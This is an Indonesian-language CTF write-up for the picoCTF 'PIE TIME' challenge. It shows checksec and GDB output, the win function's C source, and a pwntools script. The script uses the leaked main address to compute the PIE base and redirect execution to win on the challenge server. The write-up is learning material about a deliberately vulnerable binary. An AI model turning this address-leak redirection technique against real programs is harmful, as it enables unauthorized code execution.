# picoCTF2026-PIE TIME

# overview
<img width="449" height="395" alt="image" src="https://github.com/user-attachments/assets/8e2078a1-d442-4210-99e9-ec9386a60624" />

challenge pie time. kita disini diberi file dan koneksi nc server. sesuai namanya. chall ini memiliki proteksi pie `(Position Independent Executable)`. nanti akan kujelaskan di
**how it works**. dan untuk membypass proteksi ini kita harus melakukan leak alamat memori program dan menghitung offset memori server yang sudah diacak.

# tools
- GDB (sangat disarankan)
- pwntools python libc (sangat disarankan)
- vs codium (opsional)

# recon & analysis
aku akan coba kerjakan secara lokal dulu agar tidak terhalang oleh kecepatan koneksi internet. jadi aku download file nya. disini ada file vuln dan vuln.c  

dalam pwn langkah pertama untuk menganalisis suatu program biasanya adalah melihat metadatanya, proteksi lalu menjalankannya.
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(pie-time)
└> file vuln ; pwn checksec vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
[*] '/home/rotalactf/reno/pwn/pie-time/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled   <--- pie aktif
```
sesuai nama chall nya, disini proteksi nya aktif semua termasuk pie. maka alamat memori di dalam program akan terus diacak tiap dijalankan.  

saatnya menjalankan program itu.
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(pie-time)
└> ./vuln
Address of main: 0x5e16c3d2533d
Enter the address to jump to, ex => 0x12345: 0x12345
Your input: 12345
Segfault Occurred, incorrect address.
```
okey? sepertinya prorgam ini memberikan leak address dari main secara gratis kepada kita. dan bahkan menyiapkan input untuk melompat ke fungsi yang ingin kita tuju. bahkan dengan
hanya menjalankan nya saja kita tidak perlu menganalisis source codenya. tapi tunggu dulu. apakah ini work? aku coba memasukkan alamat mainke input untuk memeriksa apakah kita 
benar benar bisa melompat dengan input disini :
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(pie-time)
└> ./vuln
Address of main: 0x5ed64348833d
Enter the address to jump to, ex => 0x12345: 0x5ed64348833d
Your input: 5ed64348833d
Address of main: 0x5ed64348833d
Enter the address to jump to, ex => 0x12345: 0xomaga
Your input: 0
Segfault Occurred, incorrect address.
```
Wow , sepertinya benar bisa, kenapa? karena disini setelah aku menginput fungsi main, progam kembali ke kondisi awal saat dijalankan, alias dia melompat ke awal fungsi main.
dengan begini kita hanya perlu mencari target fungsi tujuan dan menghitung offsetnya untuk melompat ke fungsi tersebut.

kita bisa mencari info mengenai target kita menggunakan `GDB` atau  dari `source code C` nya.

# GDB
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(pie-time)
└> gdb vuln
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010e0  __cxa_finalize@plt
0x00000000000010f0  putchar@plt
0x0000000000001100  puts@plt
0x0000000000001110  fclose@plt
0x0000000000001120  __stack_chk_fail@plt
0x0000000000001130  printf@plt
0x0000000000001140  fgetc@plt
0x0000000000001150  signal@plt
0x0000000000001160  setvbuf@plt
0x0000000000001170  fopen@plt
0x0000000000001180  __isoc99_scanf@plt
0x0000000000001190  exit@plt
0x00000000000011a0  _start
0x00000000000011d0  deregister_tm_clones
0x0000000000001200  register_tm_clones
0x0000000000001240  __do_global_dtors_aux
0x0000000000001280  frame_dummy
0x0000000000001289  segfault_handler
0x00000000000012a7  win
0x000000000000133d  main
0x0000000000001410  __libc_csu_init
0x0000000000001480  __libc_csu_fini
0x0000000000001488  _fini
```
Waw ini nih ada fungsi menarik `0x00000000000012a7  win`  
Alamat Win : `0x00000000000012a7`

# Source Code 
jika melalui source code malah jauh lebih jelas :
```C
int win() {
  FILE *fptr;
  char c;
  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }
  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }
  printf("\n");
  fclose(fptr);
}
```
jelas sekali adalah fungsi yang memanggil file `flag.txt`. fungsi bernama `win`

# exploit
kita bisa membuat skrip automasi dengan bahasa python dan pwntools.
```Python
from pwn import *

elf = context.binary = ELF("./vuln")
# io = process("./vuln")
io = remote('rescued-float.picoctf.net', 53880)


io.recvuntil(b'Address of main: ')

leak_main_address = int(io.recvline().strip().decode(),16)
elf.address = leak_main_address - elf.sym.main

io.sendlineafter(b'0x12345:', hex(elf.sym.win))
io.interactive()
io.close()
```

result  
<img width="562" height="290" alt="image" src="https://github.com/user-attachments/assets/4a589dcc-01de-4bad-81aa-047710ea807c" />

# how it works
